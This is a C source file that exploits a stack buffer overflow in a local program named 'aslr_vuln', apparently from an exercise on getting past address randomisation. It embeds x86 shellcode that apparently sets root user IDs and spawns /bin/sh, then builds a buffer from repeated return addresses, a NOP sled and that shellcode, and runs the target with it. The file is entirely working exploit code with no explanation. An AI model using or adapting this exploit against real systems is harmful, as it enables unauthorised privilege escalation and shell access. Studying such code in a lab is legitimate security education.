#include <stdio.h>
#include <unistd.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x29\xc9\x89\xca\xb0"\
"\x46\xcd\x80\x29\xc0\x52\x68\x2f\x2f"\
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"\
"\x52\x54\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char *argv[]) {
   char buffer[200];
int i, ret;
ret = (int) &i +4;
printf("i is at: %p\n", &i);
printf("buffer is at: %p\n", buffer);
printf("RP is at: %p\n", ret);

for(i=0; i < 52; i+=4) 
     *((int *)(buffer+i)) = ret;
  memset(buffer+52, 0x90, 64); 
  memcpy(buffer+112, shellcode, sizeof(shellcode));
  execl("./aslr_vuln", "aslr_vuln", buffer,  NULL);
}
